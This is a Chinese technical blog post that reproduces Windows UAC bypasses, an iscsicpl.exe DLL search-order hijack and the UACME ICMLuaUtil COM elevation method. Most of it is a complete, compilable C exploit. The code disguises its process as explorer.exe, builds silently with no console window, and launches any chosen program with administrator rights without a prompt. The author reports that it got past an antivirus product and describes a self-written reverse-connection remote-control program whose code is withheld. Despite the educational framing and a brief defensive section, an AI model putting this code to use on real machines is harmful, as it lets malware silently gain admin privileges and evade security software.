---
title: 一次 UAC 绕过的教学复现：从 iscsicpl DLL劫持到 ICMLuaUtil COM提升
date: 2026-09-06 14:34:15
permalink: /posts/comBypassUAC/
tags: 
- BypassUAC
categories:
- Windows
draft: false
sidebar: true
---

## 前言

这篇实验的灵感来自 B 站"病毒杀软对抗"主题下的赛博斗蛐蛐：有博主在虚拟机里准备了一批样本，在默认的管理员组账户下直接双击运行，全程没有弹出 UAC 窗口，样本却在后台完成了需要管理员权限的操作。

这个现象值得先拆开看，它至少有两种解释：一是样本压根没请求管理员权限——用户级持久化、窃取浏览器凭证、加密用户目录这些在中完整性下就能完成，不需要碰 UAC；二是它确实绕过了 UAC。第二种正是本文要验证的：在默认 UAC 档 + 管理员组账户下，能否做到全程无弹窗地拿到高完整性权限？​ 注意这只覆盖到管理员（High IL），不涉及 SYSTEM。

下面是一次教学性质的技术复现，不复现原视频中的任何样本。

> 本文仅限在自有或已明确授权的受控环境中进行安全研究与教学复现，禁止将文中任何方法用于未经授权的系统。文中全部实验均在 VMware Workstation 17 Pro 的隔离虚拟机中完成。文中代码为原理性最小示例，可在自有或已明确授权的受控环境中编译验证；作者不对其任何使用后果负责，也不提供任何预编译二进制文件。

UAC（User Account Control，用户帐户控制）是微软在 Windows Vista 之后引入的一种安全机制，旨在防止恶意软件未经用户同意而获取管理员权限。UAC 的主要功能是，当一个程序尝试执行需要管理员权限的操作时，系统会弹出一个提示窗口，要求用户确认是否允许该操作，从而提高系统的安全性。

中文资料里常把各类 UAC 绕过统称为「白名单提权」，可以细分为三种机制。三者的判定依据并不相同。

第一类是 EXE autoElevate，可执行文件内嵌 autoElevate=true 清单、具备微软签名且位于受保护的系统目录时，系统允许它自身直接以高完整性级别启动，本文阶段一的 iscsicpl.exe 属于这一类。

第二类是 COM Elevation Moniker。系统自带的 COM 类（本文用到的是 CMSTPLUA，实现在系统签名的 cmlua.dll 中）在注册表声明支持提升并被列入自动批准列表，客户端用 Elevation:Administrator!new:{CLSID} 提出申请，由 appinfo 校验后交给 dllhost.exe 以高完整性级别承载，目标进程由该宿主创建。

第三类是注册表或协议劫持，利用注册表 HKCU\Software\Classes 优先级高于 HKLM 的特点劫持 shell\open\command 等键值，典型如 fodhelper 与 ms-settings。

前两类的差异直接决定了它们的可检测性：第一类需要向磁盘投放 DLL 并改动用户环境，特征重；第二类全程复用系统已签名的组件，不产生新的可执行文件，只是借用一个已被信任的高完整性宿主，因此更难被行为检测捕捉。

## 实验环境

编译工具：[TDM-GCC 10.3.0](https://github.com/jmeubank/tdm-gcc/releases/download/v10.3.0-tdm64-2/tdm64-gcc-10.3.0-2.exe)  
虚拟化平台：VMware Workstation 17 Pro  
操作系统：Windows 10 22H2 19045.6456 x64  
靶机前置条件：管理员组账户、UAC 处于默认档、在交互会话里运行  
安全软件：火绒安全软件 6.0.11.1 病毒库 2026-07-22 20:12  
说明：文中涉及安全软件检测表现的结论，均基于该版本在本次实验中的表现，不保证在其他版本或未来仍然成立  

## 实验过程

**第一阶段：iscsicpl DLL 搜索顺序劫持**

尝试了[iscsicpl_bypassUAC](https://github.com/hackerhouse-opensource/iscsicpl_bypassUAC)，利用到微软的白名单系统组件iscsicpl.exe。

iscsicpl.exe 内嵌 autoElevate 标记且由微软签名，管理员组用户启动时静默提升至高完整性级别、不弹 UAC 窗。它运行时需要加载 iscsiexe.dll——这是 iSCSI Initiator 的用户态发起方服务，微软只在 System32 提供了 64 位版本。32 位进程经 WOW64 重定向后，"系统目录"实际解析为 SysWOW64，那里同样没有这个 DLL，于是搜索沿标准顺序（应用目录 → 系统目录 → 16 位系统目录 → Windows 目录 → 当前目录 → %PATH%）一路落空，最终回落到 %PATH%。

由于前面各项要么受保护不可写、要么（当前目录）不受攻击者控制，PoC 的做法是先把当前用户注册表 HKCU\Environment 的 Path 备份后改写为 %TEMP%；再从自身资源中释放一个代理 DLL 到 %TEMP%\iscsiexe.dll，并通过改写其字符串表资源把待执行命令注入其中，同时释放一份原始 DLL 的副本 iscsiexe_org.dll；随后启动 C:\Windows\SysWOW64\iscsicpl.exe。该进程因 autoElevate 静默提升到高 IL，紧接着按搜索顺序在 %TEMP% 命中并加载恶意代理 DLL，命令便在高完整性上下文中执行。代理 DLL 会把调用转发给原始 DLL 以维持宿主功能、避免进程崩溃暴露异常，执行完毕后终止宿主进程；PoC 主进程随后将备份的 Path 写回注册表恢复现场。

在未开启火绒的环境下，实验成功获得了高完整性权限，whoami /all 显示 Mandatory Label\High Mandatory Level。

![](/images/comBypassuac/0.png)

在开启火绒的环境下，执行时被火绒的系统防护拦截。这一手法的特征非常重：需要磁盘落地一个 DLL，外加篡改用户环境注册表，两者都是成熟 EDR / 杀软的高优先级观测点，因此转向第二阶段的 COM 接口手法。

![](/images/comBypassuac/1.png)


**第二阶段：ICMLuaUtil COM类 提升**

阅读[UACMe](https://github.com/hfiref0x/UACME)公开的多种绕过技术后，转而尝试 COM 接口类手法，借助系统自带、且被列入 UAC 自动批准列表的 COM 类 CMSTPLUA（实现代码在系统签名的 cmlua.dll 中），调用它对外暴露的接口 ICMLuaUtil。COM 类决定"实例化谁"，ICMLuaUtil 是这个 COM 类实现的接口，决定"能调哪些方法"。我们要调的是其中的 ShellExec。进程通过 Elevation moniker 向 appinfo 服务申请以提升身份实例化它，系统校验请求者属管理员组、CLSID 注册了 Elevation 且标记为 Auto Approval、承载 DLL 为系统签名后静默批准，并由 dllhost.exe /Processid:{3E5FC7F9-…} 在高完整性级别下承载；随后调用 ICMLuaUtil::ShellExec（vtable 索引 9），进程创建发生在已持有完整令牌的 dllhost 内部，新建进程因此生来就是高 IL，父进程是 dllhost 而非请求方。

![](/images/comBypassuac/3.png)

运行时火绒未拦截，成功获得具有高完整性令牌的 cmd 进程，实验取得初步成功。

![](/images/comBypassuac/2.png)

**第三阶段：载荷形态与远程通信**

获取高完整权限上一步已经通了，接下来的问题在载荷形态。直接用 msf 生成的 shellcode 反弹，运行时特征明显，容易被拦截：内存里展开的模板字节会命中内容签名，经典的 cmd 反连形态则会命中网络层规则（与端口无关）。

改为自写一个最小的命令执行与远程通信程序，仍由 UACME ICMLuaUtil COM 提升方法提升权限后执行。设计上有几个刻意的选择：不使用 msf/CS 模板，全部自写；socket 句柄不绑定子进程标准流，命令输出经匿名管道回传；逐行执行命令而非交互式 PTY shell；断线自动重连；回显结果做 UTF-8 转码。

结果：在火绒开启的环境下稳定运行，whoami /all 显示 Mandatory Label\High Mandatory Level，拿到完整管理员令牌。本文只演示 COM 接口获取高完整权限的原理与教学复现，远程通信程序的实现不在本文范围内。

![](/images/comBypassuac/4.png)

## 最小化复现示例

下面是一个最小化的 UACME ICMLuaUtil COM 提升方法复现示例。编译后在默认 UAC 档的管理员组账户下运行，会以高完整性级别启动指定程序；目标程序由命令行参数指定，缺省为系统自带的 %windir%\System32\cmd.exe，用于确认获取高完整权限是否生效。编译程序默认分配控制台，执行时表现为闪过一个黑框，在编译命令里指定构建为 Windows GUI 子系统（-mwindows）实现静默运行。

```c
/*******************************************************************************
*  file : uac41.c
*  UACME ICMLuaUtil — 最小化复现示例
*
*  Reference  : 方法来源 UACME 项目记录的 41 号手法 ICMLuaUtil(Oddvar Moe @api0cradle)
*               原始发现者 Oddvar Moe / @api0cradle，代码为自行实现
*  License    : 仅限授权/受控环境的本地实验验证；按"原样"提供，不含任何担保。
*
*  Technique  : Elevated COM interface — ICMLuaUtil (CMSTPLUA)
*  Component  : CLSID_CMSTPLUA  {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
*               IID_ICMLuaUtil  {6EDD6D74-C007-4E75-B76A-E5740995E24C}
*  Mechanism  :
*    1. 中等 IL 进程经 Elevation moniker 申请提升身份实例化 CMSTPLUA；
*    2. appinfo 服务校验通过后静默放行，返回高 IL 的 COM 实例；
*    3. 调用 ICMLuaUtil::ShellExec 以高完整性启动目标程序。
*
*  前置       ：UAC 默认档 + 管理员组账户。进程启动阶段改写 PEB/LDR，
*              使自身在进程镜像视角表现为 <SystemRoot>\explorer.exe，
*              思路参考 UACME 的 supMasqueradeProcess。
*
*  子系统     ：GUI（-mwindows），无控制台、无黑框、无日志。
*
*  Build     :
*    gcc -m64 -O2 -municode -mwindows -s -static-libgcc -o uac41.exe uac41.c -lole32 -lntdll -lshell32
*
*  Usage     : uac41.exe [目标程序路径]
*              缺省 = %windir%\System32\cmd.exe，仅用于验证获取高完整权限是否生效
*              成功返回 0，失败返回非 0。
*
*******************************************************************************/

#include <windows.h>
#include <winternl.h>
#include <shellapi.h>

/* ---------------------------------------------------------------------------
 * ICMLuaUtil 接口（只定义到 ShellExec 槽位，与真实 vtable 布局一致）
 * RtlInitUnicodeString 声明见 winternl.h
 * ------------------------------------------------------------------------- */
typedef struct ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {
    HRESULT(STDMETHODCALLTYPE *QueryInterface)(ICMLuaUtil *, REFIID, void **);
    ULONG  (STDMETHODCALLTYPE *AddRef)(ICMLuaUtil *);
    ULONG  (STDMETHODCALLTYPE *Release)(ICMLuaUtil *);
    HRESULT(STDMETHODCALLTYPE *SetRasCredentials)(ICMLuaUtil *);
    HRESULT(STDMETHODCALLTYPE *SetRasEntryProperties)(ICMLuaUtil *);
    HRESULT(STDMETHODCALLTYPE *DeleteRasEntry)(ICMLuaUtil *);
    HRESULT(STDMETHODCALLTYPE *LaunchInfSection)(ICMLuaUtil *);
    HRESULT(STDMETHODCALLTYPE *LaunchInfSectionEx)(ICMLuaUtil *);
    HRESULT(STDMETHODCALLTYPE *CreateLayerDirectory)(ICMLuaUtil *);
    HRESULT(STDMETHODCALLTYPE *ShellExec)(ICMLuaUtil *, LPCWSTR lpFile,
        LPCWSTR lpParameters, LPCWSTR lpDirectory, ULONG fMask, ULONG nShow);
} ICMLuaUtilVtbl;

struct ICMLuaUtil {
    const ICMLuaUtilVtbl *lpVtbl;
};

static const GUID IID_ICMLuaUtil = { 0x6EDD6D74, 0xC007, 0x4E75,
    { 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C } };

#define CLSID_CMSTPLUA_STR  L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define ELEVATION_MONIKER   L"Elevation:Administrator!new:"

/* ---------------------------------------------------------------------------
 * 全局伪装缓冲区（生命周期覆盖整个进程）
 * ------------------------------------------------------------------------- */
static WCHAR FakeImagePath[MAX_PATH];

/*
 * MasqueradeProcess
 *
 * 把 PEB 的 ImagePathName/CommandLine 与加载器模块表中自身映像记录
 * 伪造成 <SystemRoot>\explorer.exe，思路参考 UACME 的 supMasqueradeProcess。
 * 单线程启动阶段调用，无并发。
 */
static VOID MasqueradeProcess(VOID)
{
    WCHAR szWindir[MAX_PATH];
    PPEB Peb;
    PLIST_ENTRY Head, First;
    PLDR_DATA_TABLE_ENTRY Module;

    GetWindowsDirectoryW(szWindir, MAX_PATH);

    wsprintfW(FakeImagePath, L"%s\\explorer.exe", szWindir);

    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;

    RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, FakeImagePath);
    RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, L"explorer.exe");

    /* 加载器模块链首节点即当前进程映像 */
    Head  = &Peb->Ldr->InMemoryOrderModuleList;
    First = Head->Flink;
    if (First != Head) {
        Module = CONTAINING_RECORD(First, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        RtlInitUnicodeString(&Module->FullDllName, FakeImagePath);
    }
}

/*
 * RunUac41
 *
 * 激活 elevated CMSTPLUA COM 对象并调用 ShellExec 启动目标程序。
 * 成功返回 0，失败返回 1。
 */
static int RunUac41(LPCWSTR lpszPayload)
{
    HRESULT hr;
    ICMLuaUtil *CMLuaUtil = NULL;
    WCHAR szMoniker[160];
    BIND_OPTS3 bop;
    int Result = 1;
    ULONG LastHr = 0;

    /* 1. 进程伪装 */
    MasqueradeProcess();

    /* 2. COM 初始化 */
    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        LastHr = (ULONG)hr;
        goto exit;
    }

    /* 3. 经 Elevation moniker 激活高 IL COM 对象 */
    wcscpy(szMoniker, ELEVATION_MONIKER);
    wcscat(szMoniker, CLSID_CMSTPLUA_STR);

    RtlZeroMemory(&bop, sizeof(bop));
    bop.cbStruct = sizeof(bop);
    bop.dwClassContext = CLSCTX_LOCAL_SERVER;

    hr = CoGetObject(szMoniker, (BIND_OPTS *)&bop, &IID_ICMLuaUtil, (void **)&CMLuaUtil);

    if (FAILED(hr) || CMLuaUtil == NULL) {
        LastHr = (ULONG)hr;
        goto exit;
    }

    /* 4. 高完整性 ShellExec */
    hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpszPayload, NULL, NULL, 0, SW_SHOW);

    if (FAILED(hr)) {
        LastHr = (ULONG)hr;
    }

    CMLuaUtil->lpVtbl->Release(CMLuaUtil);
    CMLuaUtil = NULL;

    if (SUCCEEDED(hr)) {
        Result = 0;
    }

exit:

    if (CMLuaUtil != NULL) {
        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
    }
    CoUninitialize();

    /* GUI 子系统无控制台：失败时弹窗提示失败码 */
    if (Result != 0 && GetConsoleWindow() == NULL) {
        WCHAR szMsg[64];
        wsprintfW(szMsg, L"uac41 failed. HR = 0x%08lx", LastHr);
        MessageBoxW(NULL, szMsg, L"uac41", MB_OK | MB_ICONERROR);
    }

    return Result;
}

/*
 * ResolvePayload
 *
 * argv[1] 非空则采用，否则回退到 %windir%\System32\cmd.exe。
 * 缺省为系统自带的 cmd.exe，仅用于验证获取高完整权限结果，
 * 请勿用于未授权系统。
 */
static VOID ResolvePayload(LPWSTR Out, DWORD cch, int argc, wchar_t **argv)
{
    if (argc > 1 && argv != NULL && argv[1] != NULL && argv[1][0] != L'\0') {
        wcsncpy(Out, argv[1], cch - 1);
        Out[cch - 1] = L'\0';
    }
    else {
        GetWindowsDirectoryW(Out, cch);
        wcscat(Out, L"\\System32\\cmd.exe");
    }
}

/*
 * GUI 入口（-mwindows，进程不分配控制台，双击无黑框）
 */
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    PWSTR lpCmdLine, int nCmdShow)
{
    WCHAR szPayload[MAX_PATH];
    LPWSTR *argv;
    int argc;

    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    UNREFERENCED_PARAMETER(nCmdShow);

    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    ResolvePayload(szPayload, MAX_PATH, argc, argv);
    if (argv != NULL) {
        LocalFree(argv);
    }

    return RunUac41(szPayload);
}
```

编译命令（编译工具[TDM-GCC 10.3.0](https://github.com/jmeubank/tdm-gcc/releases/download/v10.3.0-tdm64-2/tdm64-gcc-10.3.0-2.exe)）

```cmd
gcc -m64 -O2 -municode -mwindows -s -static-libgcc -o uac41.exe uac41.c -lole32 -lntdll -lshell32
```

## 防御视角

UAC 不是安全边界，微软明确不把它当漏洞修。

- 日常使用标准账户
- UAC 滑块拉到最高档
- 绝对不要为了"清净"关闭 UAC，也不要习惯性点"以管理员身份运行"
- 保持 Windows 更新，保留系统自带的安全中心 / SmartScreen
- 别装来路不明的破解/绿色软件，别随手关杀软


## 参考与致谢

- [用户帐户控制工作原理 - 微软](https://learn.microsoft.com/zh-cn/windows/security/application-security/application-control/user-account-control/how-it-works)
- [UACME - hfiref0x](https://github.com/hfiref0x/UACME) UACME COM接口提升（CMSTPLUA / ICMLuaUtil）的原理与兼容性判断，均依据该项目源码与 README 中的方法兼容表。
- Oddvar Moe（@api0cradle） — Method 41 的原始发现者，对应实现见 UACME Source/Akagi/methods/api0cradle.c。